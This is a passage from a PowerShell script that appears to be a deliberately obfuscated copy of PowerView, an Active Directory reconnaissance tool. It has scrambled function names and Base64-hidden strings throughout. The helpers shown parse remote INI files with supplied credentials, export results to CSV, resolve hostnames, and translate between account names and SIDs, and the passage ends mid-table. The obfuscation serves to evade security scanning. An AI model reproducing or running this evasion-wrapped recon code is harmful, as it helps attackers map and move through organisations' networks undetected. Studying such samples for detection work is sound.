            ${/=\/\__/\/\__/=\/} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEEAbABsAG8AdwBOAHUAbABsAHwAQQBsAGwAbwB3AEUAbQBwAHQAeQBTAHQAcgBpAG4AZwB8AEEAbABsAG8AdwBFAG0AcAB0AHkAQwBvAGwAbABlAGMAdABpAG8AbgB8AFYAYQBsAGkAZABhAHQAZQBDAG8AdQBuAHQAfABWAGEAbABpAGQAYQB0AGUATABlAG4AZwB0AGgAfABWAGEAbABpAGQAYQB0AGUAUABhAHQAdABlAHIAbgB8AFYAYQBsAGkAZABhAHQAZQBSAGEAbgBnAGUAfABWAGEAbABpAGQAYQB0AGUAUwBjAHIAaQBwAHQAfABWAGEAbABpAGQAYQB0AGUAUwBlAHQAfABWAGEAbABpAGQAYQB0AGUATgBvAHQATgB1AGwAbAB8AFYAYQBsAGkAZABhAHQAZQBOAG8AdABOAHUAbABsAE8AcgBFAG0AcAB0AHkAKQAkAA==')))
            ${__/===\/\_/===\/=} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBBAGwAaQBhAHMAJAA=')))
            ${_/===\/\/==\____/} = New-Object -TypeName System.Management.Automation.ParameterAttribute
            switch -regex ($PSBoundParameters.Keys) {
                ${__/\_/\_/\/=\/===} {
                    Try {
                        ${_/===\/\/==\____/}.$_ = . ${_/\__/\/\_/\/==\_}
                    }
                    Catch {
                        $_
                    }
                    continue
                }
            }
            if(${__/\_/====\/====\}.Keys -contains $Name) {
                ${__/\_/====\/====\}.$Name.Attributes.Add(${_/===\/\/==\____/})
            }
            else {
                ${/=\_/==\/========} = New-Object -TypeName Collections.ObjectModel.Collection[System.Attribute]
                switch -regex ($PSBoundParameters.Keys) {
                    ${/=\/\__/\/\__/=\/} {
                        Try {
                            ${__/=\__/===\_____} = New-Object -TypeName $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACQAewBfAH0AQQB0AHQAcgBpAGIAdQB0AGUA'))) -ArgumentList (. ${_/\__/\/\_/\/==\_}) -ErrorAction Stop
                            ${/=\_/==\/========}.Add(${__/=\__/===\_____})
                        }
                        Catch { $_ }
                        continue
                    }
                    ${__/===\/\_/===\/=} {
                        Try {
                            ${____/=\/=\_/=====} = New-Object -TypeName System.Management.Automation.AliasAttribute -ArgumentList (. ${_/\__/\/\_/\/==\_}) -ErrorAction Stop
                            ${/=\_/==\/========}.Add(${____/=\/=\_/=====})
                            continue
                        }
                        Catch { $_ }
                    }
                }
                ${/=\_/==\/========}.Add(${_/===\/\/==\____/})
                ${_/\/\__/\/=\__/==} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameter -ArgumentList @($Name, ${_/=\/\/\_/\/\/\__/}, ${/=\_/==\/========})
                ${__/\_/====\/====\}.Add($Name, ${_/\/\__/\/=\__/==})
            }
        }
    }
    End {
        if(!$CreateVariables -and !$Dictionary) {
            ${__/\_/====\/====\}
        }
    }
}
function ______/==\/\/===== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        ${__/\_/\/=\/\_/\_/=}
    )
    BEGIN {
        ${_/\__/\/====\_/=\} = @{}
    }
    PROCESS {
        ForEach (${/=\_/==\/===\____} in $Path) {
            if ((${/=\_/==\/===\____} -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                ${_/\____/=\_/====\} = (New-Object System.Uri(${/=\_/==\/===\____})).Host
                if (-not ${_/\__/\/====\_/=\}[${_/\____/=\_/====\}]) {
                    ___/=\_/\_/=\/\_/\ -____/=\/=\_/=\/\/ ${_/\____/=\_/====\} -Credential $Credential
                    ${_/\__/\/====\_/=\}[${_/\____/=\_/====\}] = $True
                }
            }
            if (Test-Path -Path ${/=\_/==\/===\____}) {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                    ${/==\/\__/==\/\/\_} = New-Object PSObject
                }
                else {
                    ${/==\/\__/==\/\/\_} = @{}
                }
                Switch -Regex -File ${/=\_/==\/===\____} {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcAFsAKAAuACsAKQBcAF0A'))) 
                    {
                        ${___/\___/=\____/=} = $matches[1].Trim()
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            ${___/\___/=\____/=} = ${___/\___/=\____/=}.Replace(' ', '')
                            ${_/==\_/=\___/\/\/} = New-Object PSObject
                            ${/==\/\__/==\/\/\_} | Add-Member Noteproperty ${___/\___/=\____/=} ${_/==\_/=\___/\/\/}
                        }
                        else {
                            ${/==\/\__/==\/\/\_}[${___/\___/=\____/=}] = @{}
                        }
                        ${/\____/===\/\/\/\} = 0
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoADsALgAqACkAJAA='))) 
                    {
                        ${/==\/==\/\/\___/=} = $matches[1].Trim()
                        ${/\____/===\/\/\/\} = ${/\____/===\/\/\/\} + 1
                        $Name = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBlAG4AdAA='))) + ${/\____/===\/\/\/\}
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${/==\/\__/==\/\/\_}.${___/\___/=\____/=} | Add-Member Noteproperty $Name ${/==\/==\/\/\___/=}
                        }
                        else {
                            ${/==\/\__/==\/\/\_}[${___/\___/=\____/=}][$Name] = ${/==\/==\/\/\___/=}
                        }
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuACsAPwApAFwAcwAqAD0AKAAuACoAKQA='))) 
                    {
                        $Name, ${/==\/==\/\/\___/=} = $matches[1..2]
                        $Name = $Name.Trim()
                        ${/=\__/\/\__/\____} = ${/==\/==\/\/\___/=}.split(',') | % { $_.Trim() }
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQAcAB1AHQATwBiAGoAZQBjAHQA')))]) {
                            $Name = $Name.Replace(' ', '')
                            ${/==\/\__/==\/\/\_}.${___/\___/=\____/=} | Add-Member Noteproperty $Name ${/=\__/\/\__/\____}
                        }
                        else {
                            ${/==\/\__/==\/\/\_}[${___/\___/=\____/=}][$Name] = ${/=\__/\/\__/\____}
                        }
                    }
                }
                ${/==\/\__/==\/\/\_}
            }
        }
    }
    END {
        ${_/\__/\/====\_/=\}.Keys | _______/\__/=\/=\/
    }
}
function Export-PowerViewCSV {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,
        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,
        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',
        [Switch]
        $Append
    )
    BEGIN {
        ${_____/\/\_/=\_/\_} = [IO.Path]::GetFullPath($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA=')))])
        ${_/\/\_/\_/\/\_/==} = [System.IO.File]::Exists(${_____/\/\_/=\_/\_})
        ${/===\_/\/\/===\_/} = New-Object System.Threading.Mutex $False,$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBTAFYATQB1AHQAZQB4AA==')))
        $Null = ${/===\_/\/\/===\_/}.WaitOne()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQA')))]) {
            ${/==\/\/\/\_/=\/==} = [System.IO.FileMode]::Append
        }
        else {
            ${/==\/\/\/\_/=\/==} = [System.IO.FileMode]::Create
            ${_/\/\_/\_/\/\_/==} = $False
        }
        ${_/=\_/=\/\____/\/} = New-Object IO.FileStream(${_____/\/\_/=\_/\_}, ${/==\/\/\/\_/=\/==}, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        ${_/=\_/=\/\_/\_/=\} = New-Object System.IO.StreamWriter(${_/=\_/=\/\____/\/})
        ${_/=\_/=\/\_/\_/=\}.AutoFlush = $True
    }
    PROCESS {
        ForEach (${__/======\_/\/=\/} in $InputObject) {
            ${___/=========\/\_} = ConvertTo-Csv -InputObject ${__/======\_/\/=\/} -Delimiter $Delimiter -NoTypeInformation
            if (-not ${_/\/\_/\_/\/\_/==}) {
                ${___/=========\/\_} | % { ${_/=\_/=\/\_/\_/=\}.WriteLine($_) }
                ${_/\/\_/\_/\/\_/==} = $True
            }
            else {
                ${___/=========\/\_}[1..(${___/=========\/\_}.Length-1)] | % { ${_/=\_/=\/\_/\_/=\}.WriteLine($_) }
            }
        }
    }
    END {
        ${/===\_/\/\/===\_/}.ReleaseMutex()
        ${_/=\_/=\/\_/\_/=\}.Dispose()
        ${_/=\_/=\/\____/\/}.Dispose()
    }
}
function _____/=\_/\/==\/\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${____/=\/=\_/=\/\/} = ${Env:____/=\/=\_/=\/\/}
    )
    PROCESS {
        ForEach (${__/\__/\/\_/=====} in ${____/=\/=\_/=\/\/}) {
            try {
                @(([Net.Dns]::GetHostEntry(${__/\__/\/\_/=====})).AddressList) | % {
                    if ($_.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        ${__/\/=\/\/\/==\__} = New-Object PSObject
                        ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\__/\/\_/=====}
                        ${__/\/=\/\/\/==\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) $_.IPAddressToString
                        ${__/\/=\/\/\/==\__}
                    }
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBSAGUAcwBvAGwAdgBlAC0ASQBQAEEAZABkAHIAZQBzAHMAXQAgAEMAbwB1AGwAZAAgAG4AbwB0ACAAcgBlAHMAbwBsAHYAZQAgACQAewBfAF8ALwBcAF8AXwAvAFwALwBcAF8ALwA9AD0APQA9AD0AfQAgAHQAbwAgAGEAbgAgAEkAUAAgAEEAZABkAHIAZQBzAHMALgA=')))
            }
        }
    }
}
function ___/===\/\/\_/\/\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        ${/=\_/\/\/=\__/\_/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${__/=\/====\_/\__/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${__/=\/====\_/\__/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${__/=\/====\_/\__/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/=\/====\_/\__/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach ($Object in ${/=\_/\/\/=\__/\_/}) {
            $Object = $Object -Replace '/','\'
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                ${______/=\/==\_/\_} = __/=\____/===\/==\ -Identity $Object -_/=\/=\/==\/\_/=\_ 'DN' @__/=\/====\_/\__/
                if (${______/=\/==\_/\_}) {
                    $UserDomain = ${______/=\/==\_/\_}.SubString(${______/=\/==\_/\_}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${/=\/=\_/\_/\/\_/\} = ${______/=\/==\_/\_}.Split(',')[0].split('=')[1]
                    ${__/=\/====\_/\__/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${/=\/=\_/\_/\/\_/\}
                    ${__/=\/====\_/\__/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                    ${__/=\/====\_/\__/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA')))
                    ___/\___/\__/===\/ @__/=\/====\_/\__/ | select -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
                        ${__/=\/====\_/\__/} = @{}
                        $Domain = (____/\/\/=\/\/==\/ @__/=\/====\_/\__/).Name
                    }
                    ${_/=====\/\_/\__/\} = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    ${_/=====\/\_/\__/\}.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBDAG8AbgB2AGUAcgB0AFQAbwAtAFMASQBEAF0AIABFAHIAcgBvAHIAIABjAG8AbgB2AGUAcgB0AGkAbgBnACAAJABEAG8AbQBhAGkAbgBcACQATwBiAGoAZQBjAHQAIAA6ACAAJABfAA==')))
                }
            }
        }
    }
}
function _/===\/=\_/\____/\ {
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        ${__/\_/=\__/=\__/\},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/==\/===\/=\_____} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\/===\/=\_____}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ForEach (${/=\_/==\__/==\/\_} in ${__/\_/=\__/=\__/\}) {
            ${/=\_/==\__/==\/\_} = ${/=\_/==\__/==\/\_}.trim('*')
            try {
                Switch (${/=\_/==\__/==\/\_}) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
